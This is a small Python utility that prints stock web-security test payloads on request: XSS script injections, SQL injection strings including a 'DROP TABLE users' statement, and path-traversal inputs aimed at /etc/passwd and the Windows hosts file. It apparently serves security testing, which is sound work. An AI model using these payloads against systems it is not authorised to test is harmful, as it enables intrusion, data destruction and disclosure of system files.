"""Common test payload generator."""
import argparse

PAYLOADS = {
    "xss": ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"],
    "sqli": ["' OR 1=1--", "\" OR 1=1--", "'; DROP TABLE users;--"],
    "lfi": ["../../etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts"],
}


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--type", choices=list(PAYLOADS), required=True)
    args = p.parse_args()
    for pl in PAYLOADS[args.type]:
        print(pl)


if __name__ == "__main__":
    main()
